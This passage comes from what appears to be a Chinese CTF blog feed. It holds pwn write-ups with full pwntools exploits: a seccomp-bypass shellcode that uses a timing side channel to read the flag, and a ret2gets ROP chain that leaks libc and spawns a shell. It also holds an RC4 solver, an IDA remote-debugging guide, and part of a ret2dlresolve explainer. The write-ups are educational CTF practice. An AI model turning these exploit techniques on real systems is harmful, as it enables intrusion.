0x01 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0007</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000002  <span class="keyword">if</span> (A != open) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>mmap分配了可执行的段在buf上需写shellcode绕过沙箱提权，先opean flag文件再read到栈上通过侧信道爆破逐字节读出flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamite_xor</span>(<span class="params">io, idx, char</span>):</span><br><span class="line">    shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, idx + <span class="number">1</span>)</span><br><span class="line">    shellcode += <span class="string">&quot;mov al,[rsp+&#123;0&#125;];xor rax,&#123;1&#125;;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(char))</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input your shellcode: &#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;\033[0;34mmov al,[rsp+&#123;0&#125;]; xor rax, &#123;1&#125;;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">chr</span>(char)))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamite_sub</span>(<span class="params">io, idx, char</span>):</span><br><span class="line">    shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, idx + <span class="number">1</span>)</span><br><span class="line">    shellcode += <span class="string">&quot;mov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(char))</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input your shellcode: &#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;\033[0;34mmov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">chr</span>(char)))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamite_add</span>(<span class="params">io, idx, char</span>):</span><br><span class="line">    shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, idx + <span class="number">1</span>)</span><br><span class="line">    shellcode += <span class="string">&quot;mov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;add rax, 2&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(char))</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input your shellcode: &#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;\033[0;33mmov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;add rax, 2;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">chr</span>(char)))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_time</span>(<span class="params">io</span>):</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recv()</span><br><span class="line">        io.recv(timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">1.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">io, idx, char</span>):</span><br><span class="line">    dynamite_sub(io, idx, char)</span><br><span class="line">    <span class="keyword">if</span> check_time(io):</span><br><span class="line">        io1 = remote(<span class="string">&#x27;node10.anna.nssctf.cn&#x27;</span>, <span class="number">25204</span>)</span><br><span class="line">        dynamite_add(io1, idx, char)</span><br><span class="line">        <span class="keyword">if</span> check_time(io1):</span><br><span class="line">            io1.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">    start_idx = <span class="built_in">len</span>(flag)  <span class="comment"># 跳过已知部分</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(start_idx, <span class="number">100</span>):  <span class="comment"># 从已知部分之后开始</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            io = remote(<span class="string">&#x27;node10.anna.nssctf.cn&#x27;</span>, <span class="number">25204</span>)</span><br><span class="line">            <span class="keyword">if</span> check(io, idx, char):</span><br><span class="line">                flag += <span class="built_in">chr</span>(char)</span><br><span class="line">                success(<span class="string">&quot;\033[0;32mflag[&#123;0&#125;]:&#123;1&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">chr</span>(char)))</span><br><span class="line">                success(<span class="string">&quot;\033[0;32mflag:&#123;0&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            io.close()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-05-25_15-13-20.png" alt="1"></p><h2 id="onlyone"><a href="#onlyone" class="headerlink" title="onlyone"></a>onlyone</h2><p>非栈上格式化字符串利用</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec <span class="built_in">fmt</span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/fmt&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>没开canary给了栈顶地址，给了puts地址，有libc和链接器，可以通过泄露出的puts地址得到libc基址，有fmt漏洞但是buf不在栈上，因为有libc所以考虑用one_gadget拿shell</p><h2 id="master-of-rop"><a href="#master-of-rop" class="headerlink" title="master_of_rop"></a>master_of_rop</h2><p>ret2gets泄露libc</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br></pre></td></tr></table></figure><p>发现没有<code>pop rdi;ret</code>程序很简单，有个puts函数和gets函数</p><p>用ret2gets泄露libc再打正常libc即可，ret2gets的知识会单独开一篇文章写</p><p>参考：</p><p><a href="https://hawksec.gitbook.io/pt/exploitation/exploracao-de-binarios/exploits/stack/ret2gets">https://hawksec.gitbook.io/pt/exploitation/exploracao-de-binarios/exploits/stack/ret2gets</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28497)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x4011AD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">attach(p, <span class="string">&#x27;b *0x4011D9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(gets_plt) + p64(gets_plt)</span><br><span class="line">payload += p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;AAAA&quot;</span> + <span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x28c0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x10f75b</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(<span class="number">0x40101a</span>) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-rc4"><a href="#easy-rc4" class="headerlink" title="easy_rc4"></a>easy_rc4</h2><p>简单的rc4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RC4</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + <span class="variable language_">self</span>.S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">            <span class="variable language_">self</span>.S[i], <span class="variable language_">self</span>.S[j] = <span class="variable language_">self</span>.S[j], <span class="variable language_">self</span>.S[i]</span><br><span class="line">        <span class="variable language_">self</span>.i = <span class="variable language_">self</span>.j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keystream</span>(<span class="params">self, length</span>):</span><br><span class="line">        i, j, S = <span class="variable language_">self</span>.i, <span class="variable language_">self</span>.j, <span class="variable language_">self</span>.S.copy()</span><br><span class="line">        keystream = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">            keystream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">        <span class="keyword">return</span> keystream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取密文字节（小端序转换）</span></span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0xCC</span>, <span class="number">0x4E</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0xF4</span>, <span class="number">0x73</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x6C</span>, <span class="number">0x4F</span>, <span class="number">0x73</span>, <span class="number">0xC0</span>, <span class="number">0xF4</span>, <span class="number">0x35</span>, <span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0xCE</span>, <span class="number">0x27</span>, <span class="number">0x76</span>, <span class="number">0x4D</span>, <span class="number">0x19</span>, <span class="number">0x60</span>, <span class="number">0x7A</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x5D</span>, <span class="number">0xC0</span>, <span class="number">0x42</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0x1C</span>, <span class="number">0xF6</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x72</span>, <span class="number">0x58</span>, <span class="number">0xD9</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0xF8</span>, <span class="number">0x13</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成密钥流并解密</span></span><br><span class="line">rc4 = RC4(<span class="string">b&#x27;FenKey!!&#x27;</span>)</span><br><span class="line">keystream = rc4.keystream(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line">flag_bytes = <span class="built_in">bytes</span>([(c ^ <span class="number">0x20</span>) ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, keystream)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag_bytes.decode())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA动态调试</title>
      <link href="/2025/05/20/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
      <url>/2025/05/20/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA动态调试"><a href="#IDA动态调试" class="headerlink" title="IDA动态调试"></a>IDA动态调试</h1><p>IDA动调有图形化界面，做逆向的时候学会了windows的，在回顾动态链接的延迟绑定的时候又尝试了用IDA远程动调elf文件</p><p>目前了解到IDA动态调试可以通过附加到一个已经运行的进程上，从而开始调试，也可以启动新进程来调试</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>F9继续运行，F7步入，F8步过，F2下断点</p><p>通过Debugger-Breakpoints-Breakpoint list或者Ctrl+Alt+B来查看已经下的断点</p><p>通过Debugger-Debugger windows-Stack trace或者Ctrl+Alt+S查看是谁调用了当前的函数</p><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><p>IDA中下断点要启动源码级调试，否则断点无效</p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/Snipaste_2025-05-20_14-39-15.png" alt="1"></p><p>也可以在Debugger中找到</p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/Snipaste_2025-05-20_14-39-56.png" alt="1"></p><h2 id="动调elf："><a href="#动调elf：" class="headerlink" title="动调elf："></a>动调elf：</h2><p>动调elf是利用IDA自己提供的调试服务器，如   linux_server   或   linux_server64  ，这些服务器可以在目标机器上运行，并通过特定端口与 IDA 客户端通信，通过远程调试。</p><p>首先要打开安装IDA的目录在&#x2F;dbgsrv中找到linux_server和linux_sever32两个文件，将其复制到装有linux系统的虚拟机中</p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/Snipaste_2025-05-20_14-16-34.png" alt="1"></p><p>在虚拟机中运行对应版本的程序(如果调试的是64位的就启动linux_server，32位就启动linux_server32)</p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/3ffbb238-1305-417d-90e0-6e8b05d8e0df.png" alt="1"></p><p>留意这里的IP和端口号</p><p>接下来切换到IDA中</p><p>打开Debugger中的process options配置调试器</p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/Snipaste_2025-05-20_14-36-17.png" alt="1"></p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/Snipaste_2025-05-20_14-25-44.png" alt="1"></p><p>要填写对应的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Application：远程计算机上需要调试的 ELF 程序的名称</span><br><span class="line">Input file：远程计算机上程序需要读取的输入文件的名称</span><br><span class="line">Directory：远程计算机上程序运行的目录</span><br><span class="line">Hostname：IP</span><br><span class="line">Port：端口</span><br></pre></td></tr></table></figure><p>然后确定，就可以启动调试器了，下断点就点对应代码行左侧即可</p><p>其他功能还在学习中</p><h2 id="动调exe"><a href="#动调exe" class="headerlink" title="动调exe"></a>动调exe</h2><p>使用本地调试比较简单，直接选择调试器为Local Windows debugger，启动即可</p><p><img src="/../images/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/Snipaste_2025-05-20_14-42-32.png" alt="1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve</title>
      <link href="/2025/05/20/ret2dlresolve/"/>
      <url>/2025/05/20/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>参考资料：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104478081">https://blog.csdn.net/seaaseesa/article/details/104478081</a></p><p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">Return-to-dl-resolve | BruceFan’s Blog</a></p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><p>ELF可执行文件由ELF头部、程序头部表和其对应的段、节头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为<code>PT_DYNAMIC</code>的段，它包含<code>.dynamic</code>节。结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>其中tag对应着每个节，比如<code>JMPREL</code>对应着<code>.rel.plt</code></p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_10-41-28.png" alt="1"></p><p>节中包含目标文件的所有信息。节的结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;     <span class="comment">//节头部字符串表节区的索引</span></span><br><span class="line">    Elf32_Word sh_type;     <span class="comment">//节类型</span></span><br><span class="line">    Elf32_Word sh_flags;    <span class="comment">//节标志，用于描述属性</span></span><br><span class="line">    Elf32_Addr sh_addr;     <span class="comment">//节的内存映像</span></span><br><span class="line">    Elf32_Off  sh_offset;   <span class="comment">//节的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;     <span class="comment">//节的长度</span></span><br><span class="line">    Elf32_Word sh_link;     <span class="comment">//节头部表索引链接</span></span><br><span class="line">    Elf32_Word sh_info;     <span class="comment">//附加信息</span></span><br><span class="line">    Elf32_Word sh_addralign;<span class="comment">//节对齐约束</span></span><br><span class="line">    Elf32_Word sh_entsize;  <span class="comment">//固定大小的节表项的长度</span></span><br><span class="line">&#125; Elf32_Shdr</span><br></pre></td></tr></table></figure><p>如下图，列出了该文件的31个节区。其中类型为REL的节区包含重定位表项</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-22-06.png" alt="1"></p><p>（1）<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;    <span class="comment">//对于可执行文件，此值为虚拟地址</span></span><br><span class="line">    Elf32_Word r_info;      <span class="comment">//符号表索引</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Elf32_R_SYM(info) ((info)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Elf32_R_TYPE(info) ((ubsigned char)(info))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Elf32_R_INFO(sym,type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-27-43.png" alt="1"></p><p>如图，在.rel.plt中列出了链接的C库函数，以下均以write函数为例，write函数的<code>r_offset=0x0804a01c</code>，<code>r_info=0x607</code></p><p>（2）<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节保存全局函数偏移表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-34-18.png" alt="1"></p><p>（3）<code>.dynsym</code>节包含了动态链接符号表，存储了程序中需要被动态链接器解析的符号信息。它包含了符号的类型（如函数、变量）、绑定（如全局、局部）、大小、地址等信息。动态链接器通过解析   .dynsym   中的符号信息，将共享库中的符号与可执行文件中的符号进行绑定。</p><p>Elf32_Sym[num]中的num对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; <span class="number">8</span></span><br></pre></td></tr></table></figure><figure class="highlight 